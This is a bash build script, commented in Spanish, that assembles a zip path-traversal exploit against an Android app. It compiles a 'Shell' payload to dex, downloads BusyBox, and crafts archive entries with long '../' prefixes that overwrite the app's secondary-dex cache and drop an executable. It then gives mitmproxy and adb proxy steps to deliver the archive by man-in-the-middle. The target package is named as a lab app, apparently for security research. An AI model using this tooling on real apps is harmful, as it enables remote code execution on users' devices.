#!/usr/bin/env bash
# build_payload.sh  –  Genera exploit_bundle.zip con path-traversal (vector NowSecure)
set -e

PKG="com.app.lab.rce"
SDK="$HOME/Library/Android/sdk"
JAR="$SDK/platforms/android-34/android.jar"
D8="$SDK/build-tools/34.0.0/d8"
OUT="payload/build"
SRC="payload/src/pwn/Shell.java"

[[ -f $JAR ]] || { echo "❌  android.jar no encontrado"; exit 1; }
[[ -f $D8  ]] || { echo "❌  d8 no encontrado"; exit 1; }

mkdir -p "$OUT"

echo "· Compilando Shell.java"
javac -cp "$JAR" -d "$OUT" "$SRC"

echo "· Generando classes.dex"
"$D8" --lib "$JAR" --min-api 16 --output "$OUT" "$OUT/pwn/Shell.class"

echo "· Empaquetando payload.zip"
(cd "$OUT" && zip -q -j payload.zip classes.dex)

if [[ ! -f "$OUT/busybox" ]]; then
  echo "· Descargando BusyBox estático"
  curl -sL -o "$OUT/busybox" \
    https://busybox.net/downloads/binaries/1.35.0-aarch64-linux-musl/busybox
  chmod +x "$OUT/busybox"
fi

echo "· Creando exploit_bundle.zip (path-traversal)"
BUSYBOX_PATH=../../../../../../../../../../../../../../../../../../../../data/data/$PKG/files/busybox
CLASSES_PATH=../../../../../../../../../../../../../../../../../../../../data/data/$PKG/code_cache/secondary-dexes/$PKG-classes2.zip

python3 - <<PY
import zipfile, pathlib, sys
out = zipfile.ZipFile("$OUT/exploit_bundle.zip", "w")
info = zipfile.ZipInfo("$BUSYBOX_PATH");  info.external_attr = 0o100755 << 16
out.writestr(info, open("$OUT/busybox","rb").read())
info = zipfile.ZipInfo("$CLASSES_PATH");  info.external_attr = 0o100644 << 16
out.writestr(info, open("$OUT/payload.zip","rb").read())
out.close()
print("✅ exploit_bundle.zip creado con path-traversal")
PY

echo
echo "✅  Bundle listo: $OUT/exploit_bundle.zip"
echo "➡  Copia a la carpeta mitmproxy y lanza:"
echo "     cp $OUT/exploit_bundle.zip mitmproxy/"
echo "     mitmproxy -s mitmproxy/offline_exploit.py -p 8090 &"
echo
echo "Luego configura el proxy en el emulador:"
echo "     adb shell settings put global http_proxy 10.0.2.2:8090"
echo "…y sigue los pasos habituales (instalar app, reiniciar, verificar)."
